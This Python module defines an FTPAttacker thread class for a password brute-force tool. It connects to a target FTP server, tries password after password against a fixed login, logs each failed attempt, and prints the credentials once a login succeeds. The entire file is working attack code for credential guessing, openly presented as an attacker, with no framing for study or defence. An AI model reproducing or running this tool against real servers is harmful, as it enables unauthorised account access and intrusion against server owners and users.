import ftplib
from target import Target, Attacker


class FTPAttacker(Attacker):
    """
    A class representing FTP-attacking thread
    """

    def __init__(self, target: Target):
        super().__init__(target)

    def try_connect(self, password):
        """
        Try to connect to the host with given password.

        :param password: the password that we try to authenticate with
        :type password: str
        :return: True if succeed/failed to authenticate, False if connection error occured
        """
        try:
            ftpclient = ftplib.FTP()
            ftpclient.connect(self.target.host, self.target.port)
            ftpclient.login(self.target.login, password)
            ftpclient.quit()
        # authentication failure
        except ftplib.error_perm:
            self.tries += 1
            self.failed_conns = 0
            print("[%s] Failed attempt against %s - user: %s, password: %s" %
                  (self.name, self.target.host, self.target.login, password))
            return True
        # failed to connect to the host
        except OSError:
            print("[%s] Connection error - %s" % (self.name, self.target.host))
            self.failed_conns += 1
            return False
        # failed to connect - other exception
        except Exception:
            print("[%s] Unknown exception while connecting to %s" %
                  (self.name, self.target.host))
            self.failed_conns += 1
            return False
        # no exceptions occured -> authentication successful
        else:
            self.tries += 1
            self.failed_conns = 0
            FTPAttacker.finish = True
            FTPAttacker.password = password
            FTPAttacker.success = True
            print("[%s] Found credentials for %s - user: %s, password: %s" %
                  (self.name, self.target.host, self.target.login, password))
            return True
        finally:
            ftpclient.close()

    def run(self):
        while FTPAttacker.finish is False:
            password = self.get_password()
            if password is None:
                continue

            while self.try_connect(password) is False and FTPAttacker.finish is False:
                pass
